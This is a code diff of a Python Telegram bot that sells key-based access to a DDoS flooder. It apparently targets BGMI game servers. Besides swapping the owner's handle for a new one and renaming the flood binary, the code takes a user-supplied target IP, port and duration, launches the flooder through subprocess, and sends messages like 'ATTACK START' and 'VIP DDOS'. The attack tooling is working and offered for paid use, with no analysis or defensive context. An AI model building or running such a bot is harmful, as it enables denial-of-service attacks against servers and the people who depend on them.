@@ -81,7 +81,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = "𝙐𝙨𝙖𝙜𝙚-> /𝙜𝙚𝙣𝙠𝙚𝙮 30 𝙙𝙖𝙮𝙨"
     else:
-        response = f"𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘾𝘼𝙉 𝙐𝙎𝙀❌𝙊𝙒𝙉𝙀𝙍 𝙊𝙒𝙉𝙀𝙍-> @rajaraj_04"
+        response = f"𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘾𝘼𝙉 𝙐𝙎𝙀❌𝙊𝙒𝙉𝙀𝙍 𝙊𝙒𝙉𝙀𝙍-> @Ayush143"
 
     await update.message.reply_text(response)
 
@@ -103,7 +103,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_keys()
             response = f"🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈"
         else:
-            response = f"✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04"
+            response = f"✅𝙊𝙒𝙉𝙀𝙍- @Ayush143"
     else:
         response = f"𝙐𝙨𝙖𝙜𝙚-> /𝙧𝙚𝙙𝙚𝙚𝙢"
 
@@ -115,7 +115,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> @rajaraj_04")
+        await update.message.reply_text("🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> @Ayush143")
         return
 
     if len(context.args) != 3:
@@ -126,7 +126,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./raja', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 🚀\n\n💣𝙃𝙊𝙎𝙏-> {target_ip}\n💣𝙋𝙊𝙍𝙏-> {port} \n💣𝙏𝙄𝙈𝙀-> {duration}\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
 
 
@@ -135,7 +135,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
+        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @Ayush143")
         return
 
     if flooding_process is not None:
@@ -143,11 +143,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_command is None:
-        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04')
+        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @Ayush143')
         return
 
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n𝙁𝘿𝘽𝙆-> @rajaraj_04\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
+    await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n𝙁𝘿𝘽𝙆-> @Ayush143\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
 
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -155,7 +155,7 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
+        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @Ayush143")
         return
 
     if flooding_process is None:
